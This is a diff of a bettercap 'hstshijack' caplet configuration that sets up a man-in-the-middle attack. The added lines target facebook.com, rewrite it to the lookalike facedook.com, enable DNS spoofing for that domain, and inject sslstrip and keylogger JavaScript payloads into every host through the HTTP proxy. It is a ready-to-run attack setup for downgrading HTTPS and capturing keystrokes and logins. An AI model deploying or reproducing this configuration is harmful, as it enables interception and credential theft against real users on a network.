@@ -1,15 +1,17 @@
-# Documentation can be found at https://github.com/bettercap/caplets/blob/master/hstshijack/README.md
+# Documentation can be found at https://github.com/bettercap/blob/master/hstshijack/README.md
 
-set hstshijack.log             caplets/hstshijack/ssl.log
-set hstshijack.payload         caplets/hstshijack/payloads/hstshijack-payload.js
-set hstshijack.ignore          github.com,*.github.com
+set hstshijack.log             /usr/local/share/bettercap/caplets/hstshijack/ssl.log
+set hstshijack.payload         /usr/local/share/bettercap/caplets/hstshijack/payloads/hstshijack-payload.js
+set hstshijack.ignore          *
 set hstshijack.targets         facebook.com,*.facebook.com
 set hstshijack.replacements    facedook.com,*.facedook.com
 set hstshijack.blockscripts    facebook.com,*.facebook.com
-set hstshijack.custompayloads  *:caplets/hstshijack/payloads/sslstrip.js
+set hstshijack.obfuscate       false
+set hstshijack.encode          true
+set hstshijack.custompayloads  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js
 
-set http.proxy.script  caplets/hstshijack/hstshijack.js
-#set net.sniff.output   hstshijack0001.pcap
-set net.sniff.verbose  false
-net.sniff   on
+set http.proxy.script  /usr/local/share/bettercap/caplets/hstshijack/hstshijack.js
+set dns.spoof.domains  facedook.com,*.facedook.com
+
 http.proxy  on
+dns.spoof   on
